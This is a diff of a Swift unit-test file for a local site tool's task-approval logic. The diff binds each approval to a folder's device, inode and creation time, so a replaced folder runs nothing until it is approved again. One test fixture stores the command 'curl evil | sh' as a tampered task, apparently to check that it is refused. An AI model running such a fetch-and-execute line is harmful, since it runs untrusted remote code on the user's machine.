@@ -11,35 +11,45 @@ final class TaskApprovalTests: XCTestCase {
                       proxy: proxy)
     }
 
+    /// The folder at `path` in these tests (its device, inode and creation time).
+    private let folder = FolderIdentity(device: 1, inode: 42, birthSeconds: 1_700_000_000, birthNanoseconds: 5)
+
     private func approved(_ file: SiteTasksFile, at sitePath: String? = nil) -> ApprovedTasks {
-        ApprovedTasks(hash: file.hash, file: file, sitePath: sitePath ?? path, stopped: [])
+        ApprovedTasks(hash: file.hash, file: file, sitePath: sitePath ?? path, stopped: [], folder: folder)
+    }
+
+    /// `TaskApproval.evaluate` for the folder at `path` (unless another is given).
+    private func evaluate(current: SiteTasksFile.LoadResult, approved: ApprovedTasks?, sitePath: String,
+                          folderIdentity: FolderIdentity? = nil) -> TaskApproval.Evaluation {
+        TaskApproval.evaluate(current: current, approved: approved, sitePath: sitePath,
+                              folderIdentity: folderIdentity ?? folder)
     }
 
     // MARK: - Evaluation
 
     func testWithoutAnApprovalNothingRuns() {
         let current = file()
-        let none = TaskApproval.evaluate(current: .none, approved: nil, sitePath: path)
+        let none = evaluate(current: .none, approved: nil, sitePath: path)
         XCTAssertEqual(none.approval, .none)
         XCTAssertNil(none.running)
 
-        let waiting = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: nil, sitePath: path)
+        let waiting = evaluate(current: .file(current, hash: current.hash), approved: nil, sitePath: path)
         XCTAssertEqual(waiting.approval, .needsApproval)
         XCTAssertNil(waiting.running, "nothing runs until approved")
         XCTAssertEqual(waiting.pending, current)
 
-        let invalid = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: nil, sitePath: path)
+        let invalid = evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: nil, sitePath: path)
         XCTAssertEqual(invalid.approval, .invalid(reason: "it isn't valid JSON"))
         XCTAssertNil(invalid.running)
 
         let empty = SiteTasksFile(tasks: [:], proxy: [:])
-        XCTAssertEqual(TaskApproval.evaluate(current: .file(empty, hash: empty.hash), approved: nil, sitePath: path).approval,
+        XCTAssertEqual(evaluate(current: .file(empty, hash: empty.hash), approved: nil, sitePath: path).approval,
                        .none, "a file with nothing in it needs no approval")
     }
 
     func testAnApprovedFileRuns() {
         let current = file()
-        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: approved(current),
+        let result = evaluate(current: .file(current, hash: current.hash), approved: approved(current),
                                            sitePath: path)
         XCTAssertEqual(result.approval, .approved)
         XCTAssertEqual(result.running, current)
@@ -50,17 +60,17 @@ final class TaskApprovalTests: XCTestCase {
     func testAChangedRemovedOrBrokenFileKeepsTheApprovedVersion() {
         let old = file("php artisan queue:work")
         let new = file("php artisan queue:work --tries=3")
-        let changed = TaskApproval.evaluate(current: .file(new, hash: new.hash), approved: approved(old), sitePath: path)
+        let changed = evaluate(current: .file(new, hash: new.hash), approved: approved(old), sitePath: path)
         XCTAssertEqual(changed.approval, .changed)
         XCTAssertEqual(changed.running, old)
         XCTAssertEqual(changed.pending, new)
 
-        let removed = TaskApproval.evaluate(current: .none, approved: approved(old), sitePath: path)
+        let removed = evaluate(current: .none, approved: approved(old), sitePath: path)
         XCTAssertEqual(removed.approval, .changed)
         XCTAssertEqual(removed.running, old)
         XCTAssertNil(removed.pending)
 
-        let broken = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: approved(old),
+        let broken = evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: approved(old),
                                            sitePath: path)
         XCTAssertEqual(broken.approval, .changed)
         XCTAssertEqual(broken.running, old)
@@ -70,7 +80,7 @@ final class TaskApprovalTests: XCTestCase {
     /// An approval belongs to a folder: a site name that now points at another folder needs approving afresh.
     func testAnApprovalDoesNotFollowTheNameToAnotherFolder() {
         let current = file()
-        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash),
+        let result = evaluate(current: .file(current, hash: current.hash),
                                            approved: approved(current, at: "/Users/me/Other/shop"), sitePath: path)
         XCTAssertEqual(result.approval, .needsApproval)
         XCTAssertNil(result.running)
@@ -82,16 +92,75 @@ final class TaskApprovalTests: XCTestCase {
         let current = file()
         let tampered = ApprovedTasks(hash: current.hash, file: file("curl evil | sh"), sitePath: path, stopped: [])
         XCTAssertFalse(tampered.isIntact)
-        XCTAssertNil(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: tampered,
+        XCTAssertNil(evaluate(current: .file(current, hash: current.hash), approved: tampered,
                                            sitePath: path).running)
         let future = ApprovedTasks(hash: "v2:" + String(current.hash.dropFirst(3)), file: current, sitePath: path, stopped: [])
         XCTAssertFalse(future.isIntact)
-        XCTAssertEqual(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: future,
+        XCTAssertEqual(evaluate(current: .file(current, hash: current.hash), approved: future,
                                              sitePath: path).approval, .needsApproval)
         let invalidStored = SiteTasksFile(tasks: ["Bad Name": TaskDefinition(run: "x", restartOnChange: nil, autostart: nil,
                                                                              stopSeconds: nil)], proxy: [:])
         XCTAssertFalse(ApprovedTasks(hash: invalidStored.hash, file: invalidStored, sitePath: path, stopped: []).isIntact,
                        "a stored definition must follow the same rules as the file")
+    }
+
+    // MARK: - The folder it was approved for
+
+    /// A folder's identity is its device, inode and creation time: the same folder (renamed away and back) keeps
+    /// it; a folder made anew at the same path doesn't.
+    func testAFolderReplacedAtTheSamePathHasAnotherIdentity() throws {
+        let base = FileManager.default.temporaryDirectory.appendingPathComponent("pdk-id-\(UUID().uuidString.prefix(6))")
+        let folder = base.appendingPathComponent("blog")
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: base) }
+        let first = try XCTUnwrap(FolderIdentity.of(path: folder.path))
+        XCTAssertEqual(FolderIdentity.of(path: folder.path), first, "stable")
+        let aside = base.appendingPathComponent("aside")
+        try FileManager.default.moveItem(at: folder, to: aside)
+        try FileManager.default.moveItem(at: aside, to: folder)
+        XCTAssertEqual(FolderIdentity.of(path: folder.path), first, "moved away and back: the same folder")
+
+        // Swapped with another folder by renames, or deleted and made again.
+        let other = base.appendingPathComponent("other")
+        try FileManager.default.createDirectory(at: other, withIntermediateDirectories: true)
+        try FileManager.default.moveItem(at: folder, to: aside)
+        try FileManager.default.moveItem(at: other, to: folder)
+        XCTAssertNotEqual(FolderIdentity.of(path: folder.path), first, "another folder renamed into its place")
+        try FileManager.default.removeItem(at: folder)
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        XCTAssertNotEqual(FolderIdentity.of(path: folder.path), first, "deleted and made again")
+        XCTAssertNil(FolderIdentity.of(path: base.appendingPathComponent("missing").path))
+    }
+
+    /// An approval holds only for the very folder it was made for: a replaced folder at the same path runs and
+    /// forwards nothing, and says why; an approval without the folder's identity (never adopted) holds for none.
+    func testAnApprovalForAReplacedFolderRunsNothing() {
+        let current = file(proxy: ["/app": 8080])
+        let made = FolderIdentity(device: 1, inode: 42, birthSeconds: 1_700_000_000, birthNanoseconds: 5)
+        let now = FolderIdentity(device: 1, inode: 77, birthSeconds: 1_800_000_000, birthNanoseconds: 0)
+        var approval = approved(current)
+        approval.folder = made
+
+        let same = evaluate(current: .file(current, hash: current.hash), approved: approval, sitePath: path,
+                                         folderIdentity: made)
+        XCTAssertEqual(same.approval, .approved)
+        XCTAssertEqual(same.running, current)
+        XCTAssertFalse(same.folderReplaced)
+
+        let replaced = evaluate(current: .file(current, hash: current.hash), approved: approval, sitePath: path,
+                                             folderIdentity: now)
+        XCTAssertEqual(replaced.approval, .needsApproval)
+        XCTAssertNil(replaced.running, "nothing runs")
+        XCTAssertEqual(replaced.pending, current)
+        XCTAssertTrue(replaced.folderReplaced)
+
+        approval.folder = nil
+        let unknown = evaluate(current: .file(current, hash: current.hash), approved: approval, sitePath: path,
+                                            folderIdentity: now)
+        XCTAssertNil(unknown.running, "an approval that never learnt its folder holds for none")
+        XCTAssertTrue(unknown.folderReplaced)
+        XCTAssertEqual(Messages.tasksFolderReplaced,
+                       "This folder was replaced since its tasks were approved. Review and approve again.")
     }
 
     // MARK: - Proxy routes
@@ -104,11 +173,16 @@ final class TaskApprovalTests: XCTestCase {
         let real = try XCTUnwrap(SiteTasksFile.realPath(folder.path))
         let routed = file(proxy: ["/app": 8080, "/own": 18443])
         var state = State(parked: [])
-        state.taskApprovals["shop"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [])
+        let identity = try XCTUnwrap(FolderIdentity.of(path: real))
+        state.taskApprovals["shop"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [],
+                                                    folder: identity)
+        state.taskApprovals["replaced"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [],
+                                                        folder: FolderIdentity(device: 0, inode: 1, birthSeconds: 0,
+                                                                               birthNanoseconds: 0))
         state.taskApprovals["moved"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: "/elsewhere", stopped: [])
         state.taskApprovals["tampered"] = ApprovedTasks(hash: "v1:nope", file: routed, sitePath: real, stopped: [])
         state.taskApprovals["unserved"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [])
-        let sites = ["shop", "moved", "tampered"].map {
+        let sites = ["shop", "moved", "tampered", "replaced"].map {
             Site(name: $0, path: folder.path, kind: .linked, secured: true, php: PHPVersion("8.4")!, pinned: false)
         }
         XCTAssertEqual(TaskApproval.routes(state: state, sites: sites, reservedPorts: [18080, 18443, 53]),
@@ -121,9 +195,9 @@ final class TaskApprovalTests: XCTestCase {
         let stored = SiteTasksFile(tasks: ["queue": TaskDefinition(run: "php artisan queue:work", restartOnChange: nil,
                                                                    autostart: nil, stopSeconds: nil)],
                                    proxy: ["/app/": 8080, "/ws": 6001])
-        let approval = ApprovedTasks(hash: stored.hash, file: stored, sitePath: path, stopped: [])
+        let approval = ApprovedTasks(hash: stored.hash, file: stored, sitePath: path, stopped: [], folder: folder)
         XCTAssertTrue(approval.isIntact, "its tasks still follow every rule")
-        let evaluation = TaskApproval.evaluate(current: .invalid(reason: "a path the rule refuses"), approved: approval,
+        let evaluation = evaluate(current: .invalid(reason: "a path the rule refuses"), approved: approval,
                                                sitePath: path)
         XCTAssertEqual(evaluation.running, stored, "its tasks keep running")
         XCTAssertEqual(evaluation.approval, .changed)
